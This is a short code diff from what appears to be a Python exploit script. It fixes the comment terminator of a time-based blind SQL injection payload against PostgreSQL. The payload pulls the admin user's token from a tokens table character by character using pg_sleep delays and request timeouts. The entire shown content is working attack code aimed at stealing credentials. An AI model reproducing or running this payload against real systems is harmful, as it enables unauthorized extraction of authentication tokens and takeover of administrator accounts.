@@ -4,7 +4,7 @@ from requests.exceptions import Timeout
 def blind_sql_injection(i,c,http_session,url):
   # sample from postgres db query
   # this is a timeout query, if we timeout, an exception is raised and the value is passed back to the source function.
-  url = url + "(SELECT%20CASE%20WHEN%20count((SELECT(SELECT%20CASE%20WHEN%20(ASCII(SUBSTRING((SELECT%20token%20FROM%20tokens%20WHERE%20username = 'admin'),"+ i + ",1))=" + c + ")%20THEN%20pg_sleep(8)%20ELSE%20$$$$%20END)))%3C%3E0%20THEN%20true%20ELSE%20false%20END);%20--"
+  url = url + "(SELECT%20CASE%20WHEN%20count((SELECT(SELECT%20CASE%20WHEN%20(ASCII(SUBSTRING((SELECT%20token%20FROM%20tokens%20WHERE%20username = 'admin'),"+ i + ",1))=" + c + ")%20THEN%20pg_sleep(8)%20ELSE%20$$$$%20END)))%3C%3E0%20THEN%20true%20ELSE%20false%20END);%20-- "
   try:
       req = requests.get(url,timeout=timeout)
   except Timeout:
